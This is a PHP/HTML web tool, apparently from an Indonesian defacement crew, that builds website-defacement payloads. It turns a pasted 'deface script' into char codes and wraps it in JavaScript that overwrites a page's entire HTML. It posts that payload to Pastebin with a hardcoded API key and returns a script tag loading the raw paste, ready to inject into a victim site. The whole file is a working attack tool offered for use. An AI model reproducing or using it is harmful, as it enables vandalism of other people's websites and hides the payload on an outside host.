<!DOCTYPE html>
<html>
<head>
<title>JSO Creator By Codexrush</title>
<meta name="description" content="JSO Creator" />
<meta http-equiv="Content-Type" content="text/html;charset=gb2312" />
<link href="https://fonts.googleapis.com/css?family=Metal Mania|Ceviche+One|Nosifer|Iceberg|Rancho|Iceland|Nova+Mono|Libre+Barcode+39+Extended+Text" rel="stylesheet" type="text/css"> 
<!-- dummy.machine.os@gmail.com -->
<!-- SXJmYW5hdG9yIE9keXNzZXkK -->
<style type="text/css">
body {
background-color: #000000;
color: #000;
font-family: terminus, monospace;
font-size: 18px;
width: auto;
max-width: auto;
margin: 0 auto;
}
.head {
		font-family: 'Fredoka One', cursive;
		text-shadow: 4px 1px red;
	}
 .textarea {
		width: 300px;
		height: 100px;
		border-radius: 10px;
		border-style: unset;
	    }
	btn {
		border-radius: 3px;
		background-color: white;
		border-style: unset;
		font-family: 'Fredoka One', cursive;
	}
a {
          color: white;
          text-decoration: none;
          font-size: 60px;
          font-family: Metal Mania;
          }
          .header {
    background: black;
    border: 1px solid red;
    padding: 20px;
           }
           .menu {
    background: black;
    text-align: center;
    border: 2px solid red;
    border-radius: 10px;
    color: #ff0000;
    padding: 10px;
}

</style>
<script>
    function runCharCodeAt() {
        input = document.charCodeAt.input.value;
        output = "";
        for(i=0; i<input.length; ++i) {
            if (output != "") output += ", ";
            output += input.charCodeAt(i);
        }
        document.charCodeAt.output.value = output;
    }
</script>
</head>
<body>
<center>
	<div class="menu">
    <a>Script Jso Creator</a>
    </div>
    <br>
    <div class="menu">
    <form name="charCodeAt" method="post">
		<textarea name="input" class="textarea" placeholder="Script Deface Lu Taroh Sini Zeyenk:3"></textarea><br><br>
		<input type="button" onclick="runCharCodeAt()" value="Convert" class="btn"><br><br>
		<textarea name="output" class="textarea"></textarea><br><br>
		<input type="submit" name="submit" value="Create" class="btn"><br><br>
</form>
    <br>
<?php
 
if (isset($_POST['submit'])) {
    if (empty($_POST['output'])) {
        echo "<script>alert('Convert ini dulu sob :)');</script>";
    } else {
$isi = $_POST['output'];
$random = rand(1, 99999999);
$api_dev_key            = '633fcbdacbff82bfd5dd821a9f8921f7'; // your api_developer_key
$api_paste_code         = "document.documentElement.innerHTML=String.fromCharCode(".$isi.")"; // your paste text
$api_paste_private      = '0'; // 0=public 1=unlisted 2=private
$api_paste_name         = $random; // name or title of your paste
$api_paste_expire_date      = 'N';
$api_paste_format       = 'text';
$api_user_key           = ''; // if an invalid or expired api_user_key is used, an error will spawn. If no api_user_key is used, a guest paste will be created
$api_paste_name         = urlencode($api_paste_name);
$api_paste_code         = urlencode($api_paste_code);
 
$url                = 'https://pastebin.com/api/api_post.php';
$ch                 = curl_init($url);
 
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$api_paste_private.'&api_paste_name='.$api_paste_name.'&api_paste_expire_date='.$api_paste_expire_date.'&api_paste_format='.$api_paste_format.'&api_dev_key='.$api_dev_key.'&api_paste_code='.$api_paste_code.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_NOBODY, 0);
 
$response           = curl_exec($ch);
$hasil = str_replace('https://pastebin.com', 'https://pastebin.com/raw', $response);
$asu = '<script type="text/javascript" src="'.$hasil.'"></script>';
$kk = htmlspecialchars($asu);
echo "<textarea class"btn">. $kk ."</textarea>";
}
}
 ?>
<hr>
<!-- santuy wh -->
&#169; 2019 Iron Six<br>
<small>The Next Level</small>
 </center>
</body>
</html>